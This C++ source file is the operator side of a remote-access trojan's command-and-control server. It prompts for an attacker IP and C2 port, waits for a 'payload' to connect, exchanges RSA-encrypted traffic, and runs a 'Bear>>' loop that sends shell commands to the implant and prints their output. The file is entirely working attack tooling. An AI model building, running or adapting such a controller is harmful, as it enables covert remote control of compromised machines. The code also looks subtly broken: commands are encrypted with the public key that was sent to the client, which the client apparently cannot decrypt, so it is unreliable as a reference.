//g++ RSA.cpp -o RSA.o -lssl -lcrypto

#include <iostream>
#include <string>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/err.h>
#include <vector>

// Generate RSA keys
std::pair<std::string, std::string> generate_rsa_keys() {
    RSA *rsa = RSA_new();
    BIGNUM *bne = BN_new();
    BN_set_word(bne, RSA_F4);
    RSA_generate_key_ex(rsa, 2048, bne, nullptr);

    BIO *private_bio = BIO_new(BIO_s_mem());
    BIO *public_bio = BIO_new(BIO_s_mem());

    PEM_write_bio_RSAPrivateKey(private_bio, rsa, nullptr, nullptr, 0, nullptr, nullptr);
    PEM_write_bio_RSA_PUBKEY(public_bio, rsa);

    char *private_key_ptr = nullptr;
    char *public_key_ptr = nullptr;
    long private_key_size = BIO_get_mem_data(private_bio, &private_key_ptr);
    long public_key_size = BIO_get_mem_data(public_bio, &public_key_ptr);

    std::string private_key(private_key_ptr, private_key_size);
    std::string public_key(public_key_ptr, public_key_size);

    RSA_free(rsa);
    BN_free(bne);
    BIO_free(private_bio);
    BIO_free(public_bio);

    return {private_key, public_key};
}

// Encrypt data using RSA
std::string rsa_encrypt(const std::string& data, const std::string& public_key) {
    BIO *keybio = BIO_new_mem_buf(public_key.c_str(), -1);
    RSA *rsa = PEM_read_bio_RSA_PUBKEY(keybio, nullptr, nullptr, nullptr);

    int rsa_size = RSA_size(rsa);
    std::vector<unsigned char> encrypted(rsa_size);
    int result = RSA_public_encrypt(data.length(), reinterpret_cast<const unsigned char*>(data.c_str()),
                                    encrypted.data(), rsa, RSA_PKCS1_PADDING);

    BIO_free(keybio);
    RSA_free(rsa);

    if (result == -1) {
        throw std::runtime_error("RSA encryption failed");
    }

    return std::string(reinterpret_cast<char*>(encrypted.data()), result);
}

// Decrypt data using RSA
std::string rsa_decrypt(const std::string& data, const std::string& private_key) {
    BIO *keybio = BIO_new_mem_buf(private_key.c_str(), -1);
    RSA *rsa = PEM_read_bio_RSAPrivateKey(keybio, nullptr, nullptr, nullptr);

    int rsa_size = RSA_size(rsa);
    std::vector<unsigned char> decrypted(rsa_size);
    int result = RSA_private_decrypt(data.length(), reinterpret_cast<const unsigned char*>(data.c_str()),
                                     decrypted.data(), rsa, RSA_PKCS1_PADDING);

    BIO_free(keybio);
    RSA_free(rsa);

    if (result == -1) {
        throw std::runtime_error("RSA decryption failed");
    }

    return std::string(reinterpret_cast<char*>(decrypted.data()), result);
}

// Send encrypted output to the payload
void send_to_payload(int socket, const std::string& data, const std::string& public_key) {
    std::string encrypted_data = rsa_encrypt(data, public_key);
    send(socket, encrypted_data.c_str(), encrypted_data.length(), 0);
}

// Receive encrypted commands from the payload
std::string receive_from_payload(int socket, int buffer_size, const std::string& private_key) {
    std::vector<char> buffer(buffer_size);
    int bytes_received = recv(socket, buffer.data(), buffer_size, 0);
    if (bytes_received <= 0) {
        throw std::runtime_error("Error receiving data");
    }
    std::string encrypted_data(buffer.data(), bytes_received);
    return rsa_decrypt(encrypted_data, private_key);
}

int main() {
    std::cout << "\033[0;32m";
    std::cout << R"(
⠀⠀⠀⢠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣀⣀⣀⠃⢻⣢⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢕⠢⡀⠀⠀⠀⠀⠀⠀⠀
⠘⢶⡶⠄⢨⠁⢶⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢯⠢⣀⠀⠀⠀⠀⠀
⠀⠀⢇⡸⠚⢧⡈⡄⠀⠀⠀⣠⠤⠤⠤⠤⠤⡤⠀⠀⠀⠻⡄⠱⡄⠀⠀⠀
⠀⠀⠋⠀⠀⠀⠈⠁⠀⡠⠊⢀⡀⢠⡆⡠⠊⠀⠀⠀⠀⠀⠱⡘⠈⢦⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡠⠊⠀⢀⡀⢙⣷⣏⠀⠀⠀⠀⠀⠀⠀⠀⢡⠀⠀⢣⠀
⠀⠀⠀⠀⠀⢰⣯⡀⢀⡔⢟⡵⡅⠈⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⡜⢀⡞⡆
⠀⠀⠀⠀⠀⠀⠙⢿⣫⠔⠉⠀⠈⢆⠀⠙⢾⣦⡀⠀⠀⠀⠀⠀⡇⡿⡝⢡
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠈⠙⣬⡢⡀⠀⠀⢀⢷⣾⡃⠸
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠣⡀⠀⠻⣎⠢⡀⠜⠾⠁⠂⡆
⠀⠀⠀⠀⠀⡤⠠⡔⢸⣦⠀⠀⠀⠀⠀⠀⠀⠈⠢⡱⣌⠳⡜⠮⡀⠀⡸⠀
⠀⠀⠀⣀⠔⢀⣴⣾⣄⠙⢱⠤⣀⠀⠀⠀⠀⠀⠀⣹⣽⢦⡈⠂⠈⢶⠁⠀
⢠⠔⠉⢀⢔⠟⠁⠀⠙⢧⣐⠞⠞⠯⠔⣲⠶⠶⣿⠎⠀⠳⣽⣦⠀⠀⠑⡄
⣇⣠⣴⣮⠎⠀⠀⠀⠀⠀⠉⠒⠤⢀⣜⡁⠚⠙⣁⡠⠴⠊⠉⠻⣓⠤⠚⠁
⠈⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
)";
    std::cout << "\033[0m\n";

    std::string attacker_ip, c2_port;
    std::cout << "[*] Enter your IP: ";
    std::getline(std::cin, attacker_ip);
    std::cout << "[*] Enter C2 server port: ";
    std::getline(std::cin, c2_port);

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        std::cerr << "Socket creation failed: " << strerror(errno) << std::endl;
        return 1;
    }

    sockaddr_in address;
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(attacker_ip.c_str());
    address.sin_port = htons(std::stoi(c2_port));

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        std::cerr << "Socket bind failed: " << strerror(errno) << std::endl;
        return 1;
    }

    if (listen(server_fd, 5) < 0) {
        std::cerr << "Socket listen failed: " << strerror(errno) << std::endl;
        return 1;
    }

    std::cout << "[*] Waiting for incoming connection...\n";

    int client_socket = accept(server_fd, nullptr, nullptr);
    if (client_socket < 0) {
        std::cerr << "Socket accept failed: " << strerror(errno) << std::endl;
        return 1;
    }

    auto [private_key, public_key] = generate_rsa_keys();

    // Send the public key to the client
    send(client_socket, public_key.c_str(), public_key.length(), 0);

    // Main loop for fetching and executing commands
    while (true) {
        std::string command;
        std::cout << "[*] Bear>> ";
        std::getline(std::cin, command);

        send_to_payload(client_socket, command, public_key);

        if (command == "exit") {
            std::cout << "Exiting...\n";
            break;
        }

        std::string output = receive_from_payload(client_socket, 4096, private_key);
        std::cout << "[*] Command Output:\n" << output << std::endl;

        sleep(10); // Adjustable sleep time
    }

    close(client_socket);
    close(server_fd);

    return 0;
}

